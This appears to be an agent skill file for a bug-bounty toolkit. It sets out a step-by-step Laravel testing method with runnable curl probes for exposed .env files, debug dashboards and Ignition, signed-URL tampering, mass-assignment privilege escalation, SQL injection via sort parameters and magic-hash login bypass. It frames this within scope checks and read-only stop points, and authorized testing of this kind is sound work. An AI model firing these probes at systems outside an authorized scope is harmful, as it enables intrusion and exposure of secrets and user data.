---
name: zp-laravel
description: ZeroProtocol hunter for Laravel and PHP application footguns - .env and APP_KEY exposure, debug mode and Ignition, Telescope, Horizon and Debugbar dashboards, mass assignment through fillable and guarded, replayable or unsigned signed URLs, Eloquent raw-query injection, docroot and storage-disk exposure, unencrypted cookies and loose-comparison auth bypass. Use when a laravel_session or XSRF-TOKEN cookie, a Whoops page, an Illuminate stack frame or a /storage/ path appears.
---

# zp-laravel - one key holds the whole app

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0 before any request.
Exit 1 refuse and name the pattern · 3 stop · 4 stop.

Laravel is a well-built framework deployed badly. Nearly every finding here is one of two sentences: **a
file that belongs above the docroot is being served**, or **the developer handed the request object
straight to the model**. The bar is a response no anonymous user should see, or a column no request should be able to write - reproduced twice, on an object you own.

---

## Procedure

**1. Confirm Laravel, then find where the docroot points.** `public/` is the only directory Laravel intends to expose, and that second question decides the engagement.

```bash
H=target.tld
curl -skI "https://$H/" | grep -iE 'set-cookie|x-powered-by|^server:'
curl -sk "https://$H/" | grep -oiE 'laravel|Illuminate|csrf-token|livewire|/storage/[^"]{0,40}' | sort -u
curl -sk -o /dev/null -w 'public/index.php %{http_code} %{size_download}\n' "https://$H/public/index.php"
```

| Signal | Reading |
|---|---|
| `Set-Cookie: laravel_session=`, `XSRF-TOKEN=` | Laravel or Lumen. `XSRF-TOKEN` is readable by design - not a finding |
| `/public/index.php` renders the app | **docroot is the project root.** `.env`, `storage/`, `vendor/` are served. Step 2 |
| `/livewire/livewire.js`, `wire:model` in the HTML | Livewire present; fingerprint it for `zp-cve` |

There is no Laravel version header. Pin it from what shipped - `composer.lock` (`laravel/framework`, `livewire/livewire`, `facade/ignition`, `barryvdh/laravel-debugbar`), or `VERSION` in
`vendor/laravel/framework/src/Illuminate/Foundation/Application.php`.

**2. `.env`, the files above `public/`, and the storage disk.** Plain GETs, no fuzzer needed.

```bash
for p in .env .env.bak .env.old .env.save .env.local .env.production .env~ .env.example \
         composer.lock artisan storage/logs/laravel.log storage/app/public/ .git/config; do
  printf '%-32s ' "$p"; curl -sk -o /dev/null -w '%{http_code} %{size_download} %{content_type}\n' "https://$H/$p"
done
curl -sk "https://$H/.env" | grep -aiE '^(APP_KEY|APP_ENV|APP_DEBUG|DB_|MAIL_|AWS|REDIS|STRIPE)' | head
```

`.env.example` ships in every Laravel repo and holds placeholders - **killed**, every time; a real `.env` is the top finding in this class. `public/storage` is a symlink to `storage/app/public`, so
**everything on the `public` disk is readable with no session** at `/storage/<path>` - upload your own file, learn the path shape, then ask whether invoices or ID documents landed there too. Prove that with your own object, never by guessing another user's filename.

**3. Debug mode, Ignition, environment override.**

```bash
curl -sk "https://$H/zp-nope-$RANDOM" | grep -aoiE 'whoops|ignition|APP_KEY|DB_PASSWORD|/var/www[^ "<]{0,50}' | sort -u
curl -sk "https://$H/_ignition/health-check"; curl -sk "https://$H/?--env=local" | grep -aoim1 whoops
```

`APP_DEBUG=true` leaks env values, paths and SQL bindings. `{"can_execute_commands":true}` plus debug mode is the CVE-2021-3129 precondition (`facade/ignition` < 2.5.2); `?--env=local` flipping the env is
CVE-2024-52301, needing PHP `register_argc_argv=On`, fixed in 11.31.0 / 10.48.23 / 9.52.17. **Stop at the precondition** - step 9.

**4. Telescope, Horizon, Debugbar** - three dashboards whose gate is a closure most teams never write.

```bash
for p in telescope horizon _debugbar/open _debugbar/assets/stylesheets \
         horizon/api/stats horizon/api/jobs/failed telescope/telescope-api/requests; do
  printf '%-40s ' "/$p"; curl -sk -o /dev/null -w '%{http_code} %{size_download} %{content_type}\n' "https://$H/$p"
done
curl -sk -X POST "https://$H/telescope/telescope-api/requests" -H 'Content-Type: application/json' -d '{"take":5}' | head -c 500
curl -sk "https://$H/horizon/api/jobs/failed?starting_at=-1&limit=5" | python3 -m json.tool 2>/dev/null | head -30
```

Telescope's index endpoints are POST in current releases and GET in older ones, and the API prefix has moved - read it from the dashboard's own markup: `curl -sk https://$H/telescope | grep -oE '/telescope[^"]*'`.
Debugbar sends a `phpdebugbar-id` header on XHR responses, and that id is the argument to `/_debugbar/open?op=get&id=<id>`, which replays a stored request with its SQL and session.

**5. Cookie encryption, and what a leaked `APP_KEY` proves.** A Laravel cookie is base64 JSON with `iv`, `value`, `mac`; anything else in the jar sits in `EncryptCookies::$except`.

```bash
C=$(curl -skI "https://$H/" | grep -oiE 'laravel_session=[^;]+' | head -1 | cut -d= -f2-)
python3 -c 'import sys,base64,json,urllib.parse as u; r=u.unquote(sys.argv[1])
try: print({k:v[:24]+"..." for k,v in json.loads(base64.b64decode(r+"="*(-len(r)%4))).items()})
except Exception as e: print("NOT an encrypted envelope ->", r[:80], "|", e)' "$C"
```

With a leaked key the accepted proof is decrypting **your own** session cookie and showing its plaintext - that pins the key to the live host without touching another account.

**6. Signed URLs** - HMAC-SHA256 over the URL minus `signature`, checked by `hasValidSignature`.

```bash
grep -hoE 'https?://[^ "]+[?&]signature=[0-9a-f]{64}[^ "]*' surface/urls.txt js/*.js 2>/dev/null | sort -u
U='https://target.tld/invite/accept?user=7&expires=1790000000&signature=<64hex>'
probe(){ printf '%-34s ' "$2"; curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' "$1"; }
probe "${U%%\?*}?user=7"  "signature removed"; probe "${U/user=7/user=8}" "target swapped, sig kept"
probe "${U//&expires=1790000000/}" "expiry stripped";  probe "$U" "replayed after it succeeded once"
probe "${U}&zp=1"         "param appended - must invalidate"
```

**7. Mass assignment** - `$guarded = []` plus `create($request->all())` or `update($request->all())`. Add fields the form never shows, then **re-read your own record**.

```bash
J='{"name":"zp","email":"zp+91234@example.com"}'
for x in '"is_admin":true' '"admin":1' '"role":"admin"' '"role_id":1' '"is_verified":true' \
         '"email_verified_at":"2020-01-01 00:00:00"' '"team_id":1' '"user_id":1' '"credits":9999'; do
  printf '%-40s ' "$x"; curl -sk -o /dev/null -w '%{http_code}\n' -X PUT "https://$H/api/profile" \
    -H "Cookie: laravel_session=$TOK_A" -H 'Content-Type: application/json' -d "${J%\}},$x}"
done
curl -sk "https://$H/api/profile" -H "Cookie: laravel_session=$TOK_A" | python3 -m json.tool | head -30
```

Nested and dotted forms reach `fill()` through Laravel's request flattening too - `"user.role"`, `"roles":[{"id":1}]`, `profile[is_admin]=1`.

**8. Raw Eloquent, and PHP comparison semantics.** `where()` is parameterised; the `*Raw` family and an interpolated `DB::select` are not, and a column name can never be bound.

```bash
for v in "1" "1'" "1)" "id" "id--" "1,1" "(select 1)" "name,(select sleep(0))"; do
  printf '%-22s ' "$v"; curl -sk -o /dev/null -w '%{http_code} %{size_download} %{time_total}\n' \
    --get "https://$H/api/items" --data-urlencode "sort=$v" --data-urlencode "dir=asc"
done
for pw in 'true' '0' '[]' '{"x":1}'; do printf '%-8s ' "$pw"; curl -sk -o /dev/null -w '%{http_code}\n' \
  -X POST "https://$H/api/login" -H 'Content-Type: application/json' -d "{\"email\":\"zp@example.com\",\"password\":$pw}"; done
```

`SQLSTATE[42000]` or an `Illuminate\Database\QueryException` is the sink - `zp-sqli` takes it from there. Type confusion is **version-gated**: `0 == "abc"` is true on PHP 7 and false on PHP 8, so `0e…` magic
hashes (`240610708`, `QNKCDZO`) bypass `md5($in) == $hash` only on PHP 7 and below. Check `X-Powered-By` first, aim at a token or hash comparison, never at `Hash::check`.

**9. Stop point - state it in the report.** You stop at the first response proving the boundary is gone: the `.env` body, the debug page, the dashboard's data, your own decrypted cookie, the extra column on your own record, the SQL error.
You do **not** run `laravel-exploits`, `phpggc` or `laravel-crypto-killer` payload generation at the target, poison `storage/logs/laravel.log`, forge a session or signed URL for an account you do not own,
use the credentials `.env` handed you, or retry, delete or clear anything in Horizon or Telescope.

---

## Probes and payloads

| Probe | Breaks | Positive looks like |
|---|---|---|
| `GET /.env`, `.env.bak`, `.env.save`, `.env~` | docroot at the project root, or an editor backup in `public/` | `APP_KEY=base64:…` in a `text/plain` body |
| `GET /public/index.php` | the vhost root one directory too high | the app renders - everything above `public/` is served |
| `GET /_ignition/health-check` | Ignition routes registered outside `local` | `{"can_execute_commands":true}` - precondition only |
| `GET /?--env=local` | CVE-2024-52301, needs `register_argc_argv=On` | debug page, or a different environment banner |
| `/telescope/telescope-api/*`, `/horizon/api/jobs/failed` | `viewTelescope`/`viewHorizon` gate never defined | request bodies, queries with bindings, job payloads |
| `/_debugbar/open?op=get&id=<id>` | `debugbar.enabled=true` in production | a replayed request with SQL, session and auth data |
| signed URL with `signature` removed, or after `expires` | route missing the `signed` middleware | the action still succeeds |
| signed URL with `user=`/`id=` swapped, signature kept | signature covers the URL, the **handler** reads the body | another object acted on - `zp-idor` territory |
| `"is_admin":true`, `"role_id":1`, `"roles":[{"id":1}]` | `$guarded = []` plus `$request->all()` | the field is there on re-read, or a gated route answers |
| `sort=`/`order=`/`column=` with `'`, `)`, `,` | `orderByRaw`, `selectRaw`, interpolated `DB::select` | `SQLSTATE[42000]`, or a `QueryException` under debug |
| `"password":true` / `0` / `[]`, `240610708` | loose comparison on a token, not `Hash::check` | a session for an account you did not authenticate to |
| a cookie that base64-decodes to plaintext, not `{"iv":…}` | `EncryptCookies::$except` | tamperable tenant, role or feature state |

Nothing beyond `curl` and `python3` stdlib is required. `nuclei -u https://$H -tags laravel` at the program's rate limit makes leads, never findings - reproduce each by hand.

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| `.env` served with a real `APP_KEY` and DB credentials | **confirmed critical exposure.** Report at once; use not one credential |
| `.env.example`, or a `.env` of placeholders (`APP_KEY=`, `changeme`) | **killed.** It is in every public Laravel repo |
| `APP_KEY` leaked **and** it decrypts your own session cookie | confirmed live key - forgery and object injection are the stated impact, not an act you perform |
| `.env` is `403`/`404` but `/public/index.php` renders the app | confirmed docroot misconfiguration with nothing readable yet - keep enumerating |
| debug page exposing env values, credentials or full paths | **confirmed.** High alone; Critical once Ignition is in range |
| `/_ignition/health-check` answers but debug mode is off | precondition incomplete. Exposure, **not** RCE |
| Telescope, Horizon or Debugbar returns real request or job data anonymously | **confirmed.** High - severity from what the payloads hold |
| `/telescope` returns `403`, a login redirect, or an empty SPA shell | **killed.** The gate works; a shell is not data |
| signed URL succeeds with `signature` stripped, or long after `expires` | **confirmed.** Severity from the action behind it; if an appended param and a swapped target both invalidate and the expiry is enforced, it is correctly signed and killed |
| extra field accepted (`200`) but absent on re-read | `$fillable` filtered it. **Killed** - the status code is not evidence |
| `is_admin` written and a privileged route now answers for your user | **confirmed privilege escalation via mass assignment.** Critical |
| `SQLSTATE` in a response body | confirmed injectable sink -> `zp-sqli` for reach and severity |
| `"password":true` returns `500` or a `QueryException` | a type error, not a bypass. Killed |
| a version inside a CVE range with no behavioural probe | **unconfirmed.** Back-ports are normal in LTS - `zp-cve`'s rule applies |

---

## High-value patterns

- **A vhost pointing at the project root instead of `public/`** - one line of config hands over `.env`, `storage/logs/`, `composer.lock` and `vendor/`. Always test `/public/index.php`.
- **`.env` on a `staging.`, `dev.` or `preprod.` subdomain** sharing `APP_KEY` with production - the key is the finding, the weaker host only the doorway.
- **`$guarded = []` on the `User` model** with `update($request->all())` behind a profile or settings endpoint - the classic road to `is_admin`.
- **Unsubscribe, invite, approval and export links** built with `signedRoute` where the handler reads the target from the body instead of the signed path.
- **`orderByRaw($request->sort)`** on a search, table-sort or export endpoint - a column name cannot be bound, so this is where Laravel SQLi actually lives.
- **The `public` disk used for private documents** - `/storage/<path>` needs no session at all.

---

## Pitfalls

- **Reporting `.env.example`**, or an `APP_KEY` published in the vendor's own repo, as a leak.
- **Using a credential `.env` gave you.** Connecting to that database, bucket or SMTP server is unauthorized access to a *different* system, outside every program's scope.
- **Forging another user's session** because the key works. Your own cookie proves the key.
- **Running `laravel-exploits` or a gadget chain at production** - RCE with a persistence side effect; `zp-rce-ssti` draws the same line.
- **Calling a `200` a mass-assignment proof.** Laravel drops non-fillable keys silently. Re-read the record.
- **Guessing filenames under `/storage/`.** That is enumeration of real user data - prove it with your own upload.
- **Retrying or deleting Horizon jobs, or clearing Telescope.** Read-only always; those buttons change production state.

---

## Hand off to

`.env` secrets and bundle-borne keys -> `zp-js-secrets` for liveness discipline, `zp-cloud` for the
blast radius of an `AWS_` pair. Recovered source or a served `vendor/` -> `zp-code-audit`. `*Raw` sinks
-> `zp-sqli`. Signed-URL retargeting and route-parameter objects -> `zp-idor`, `zp-authz`. Cookie and
session state -> `zp-session`; login, reset and OAuth flows -> `zp-jwt-oauth`. Upload validation
bypasses -> `zp-upload`; `php://` and `phar://` wrappers -> `zp-xxe-lfi`; Blade and deserialization
execution -> `zp-rce-ssti`. Version-range CVEs (Ignition, Livewire) -> `zp-cve`; stack traces as
standalone leaks -> `zp-info-disclosure`. Unfound `.env` variants and dashboards ->
`zp-content-discovery`; the route inventory -> `zp-api`. Blade sinks needing a browser witness ->
`zp-xss` with `zp-browser`. Duplicate check -> `zp-intel`. Confirmed -> `zp-triage`, `zp-report`.
